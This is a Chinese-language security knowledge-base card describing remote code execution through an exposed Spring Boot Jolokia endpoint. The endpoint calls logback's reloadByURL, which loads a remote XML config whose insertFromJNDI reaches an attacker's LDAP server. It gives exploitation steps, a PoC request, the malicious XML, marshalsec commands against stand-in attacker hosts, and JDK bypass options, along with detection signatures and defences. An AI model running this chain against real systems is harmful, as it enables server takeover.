---
id: web-java-framework-spring-actuator-jolokia-logback-reloadbyurl-jndi-rce
title: Spring Boot Actuator Jolokia 调用 logback JMXConfigurator#reloadByURL：远程 XML 的 insertFromJNDI 触发 JNDI RCE
type: scenario
domain: web
path: web/java/framework/spring
technique: actuator-jolokia-logback-reloadbyurl-insertfromjndi-rce
aliases:
- logback reloadByURL
- JMXConfigurator JNDI
- insertFromJNDI
- /jolokia/exec 命令执行
- logback JNDI RCE
tags:
- java
- spring
- spring-boot
- actuator
- jolokia
- logback
- jndi
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V321
  verified_at: '2026-11-08T15:34:02+08:00'
  notes: 已对照原文与图09核对：/jolokia/list 存在 ch.qos.logback.classic JMXConfigurator#reloadByURL，insertFromJNDI ldap://... XML 与 /jolokia/exec/.../reloadByURL/http:!/!/... PoC、JDK 低版本条件均一致；图09仅证明 MBean 暴露，RCE 未截图，未复跑。
---

## 一句话结论

当 Spring Boot 的 Jolokia 端点未授权暴露且 classpath 有 logback 时，攻击者先通过 `/jolokia/list` 确认 `ch.qos.logback.classic.jmx.JMXConfigurator` 的 `reloadByURL` 操作，再调用它让 logback 从攻击者 URL 加载恶意配置；配置里的 `<insertFromJNDI env-entry-name="ldap://attacker:1389/..."/>` 会触发 JNDI 查找，由恶意 LDAP/RMI 服务返回引用并加载远程类，形成命令执行。

## 原理

- Jolokia 把 JMX MBean 暴露为 HTTP JSON API，支持 `LIST` 与 `EXEC`。logback 在 JMX 中注册了 `ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator`，其 `reloadByURL(java.net.URL)` 会用指定 URL 重新加载 logback 配置。
- 攻击者把一个恶意 `logback.xml` 放在自己的 HTTP 服务上，XML 中使用 logback 的 `<insertFromJNDI>` 动作：`<insertFromJNDI env-entry-name="ldap://attacker:1389/JNDIObject" as="appName"/>`。logback 解析配置时会执行 JNDI lookup。
- JNDI 客户端连接攻击者 LDAP/RMI 服务；服务返回 `Reference`，其中 `ReferenceFactory`/远程 class 地址指向攻击者托管的恶意类。低版本 JDK 允许从远程 codebase 加载类并实例化，触发构造方法或静态初始化，执行命令。
- 高版本 JDK 默认禁止远程 codebase：可改用返回本地工厂 gadget（如 Tomcat BeanFactory + ELProcessor）的 JNDI 利用工具，或换用目标 classpath 上已有的 ObjectFactory。
- Jolokia 调用路径中 `/` 需要用 `!` 转义：`reloadByURL/http:!/!/attacker!/example.xml` 会被还原为 `http://attacker/example.xml`。

## 触发条件

- `/jolokia`（1.x）或 `/actuator/jolokia`（2.x）未授权可访问，且应用引入 `jolokia-core`。
- classpath 存在 logback；`/jolokia/list` 中能看到 `ch.qos.logback.classic` 的 `JMXConfigurator` 与 `reloadByURL` 操作。
- 目标能出站访问攻击者的 HTTP 与 LDAP/RMI 服务。
- JDK 允许 JNDI 远程类加载，或攻击者有针对高版本 JDK 的本地工厂/ELProcessor 绕过链（原文标注低版本条件为 JDK < 6u201/7u191/8u182/11.0.1 的 LDAP 远程 codebase）。

## 利用步骤

1. 访问 `/jolokia/list` 或 `/actuator/jolokia/list`，搜索 `ch.qos.logback.classic` 与 `reloadByURL`，确认操作存在。
2. 在攻击机准备恶意 `logback.xml`：

```xml
<configuration>
  <insertFromJNDI env-entry-name="ldap://attacker:1389/JNDIObject" as="appName" />
</configuration>
```

3. 编译恶意类 `JNDIObject`（静态块中反弹 shell 或执行命令），放到 HTTP 根目录；用 marshalsec 启动 LDAP 引用服务：

```bash
javac -source 1.5 -target 1.5 JNDIObject.java
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker:8000/#JNDIObject 1389
```

4. 让目标加载恶意配置：请求
   `/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker:8000!/logback.xml`。
5. logback 解析 XML 时触发 JNDI lookup，目标加载 `JNDIObject` 并执行静态块；在攻击机监听端口接收反弹 shell。
6. 若 LDAP 远程 codebase 被 JDK 拦截，改用 JNDIExploit 的本地工厂模块或 `javax.el.ELProcessor` 绕过。

## PoC

```http
GET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker:8000!/logback.xml HTTP/1.1
Host: target:8080
```

恶意配置：

```xml
<configuration>
  <insertFromJNDI env-entry-name="ldap://attacker:1389/JNDIObject" as="appName" />
</configuration>
```

JNDI 服务：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker:8000/#JNDIObject 1389
```

## 变体与关联

- 变体：把 `<insertFromJNDI>` 的地址换成 `rmi://`，配合 marshalsec `RMIRefServer`。
- 变体：同一条 logback 配置加载能力也可用于 XXE（外部实体读文件），见关联卡。
- 关联：[[web-java-framework-spring-actuator-jolokia-logback-reloadbyurl-xxe-file-read]]（同一 `reloadByURL` 入口的 XXE 读文件）、[[web-java-framework-spring-actuator-restart-logging-config-logback-jndi-rce]]（同一 `insertFromJNDI` sink，但触发入口是 `logging.config` + `/restart`）、[[web-java-deserialization-jndi-low-version-rmi-ldap-remote-codebase]]（JNDI 远程 codebase 基础）。
- 边界：Jolokia 被鉴权/关闭、logback 不在 classpath、`reloadByURL` 被移除、目标不能出站、JDK 高版本且无本地工厂 gadget 时，该链不成立。

## 检测与防御

- 检测：`/jolokia/exec` 路径中出现 `logback`、`JMXConfigurator`、`reloadByURL`、`insertFromJNDI`、`ldap://`；应用异常外连 1389/1099；logback 配置从外部 URL 加载。
- 防御：关闭或鉴权 Jolokia 端点，不要把 `jolokia` 放进 `management.endpoints.web.exposure.include`；限制 Jolokia 的 MBean 操作白名单（`jolokia-access.xml`）。
- 防御：升级 JDK/禁用 JNDI 远程 codebase（`trustURLCodebase=false`）；限制应用出站访问；logback 配置只从本地受控路径加载，禁止 `reloadByURL` 指向外部 URL。
- 加固：从生产 classpath 移除不需要的 logback JMX 暴露，Actuator/Jolokia 只绑内网并加认证。
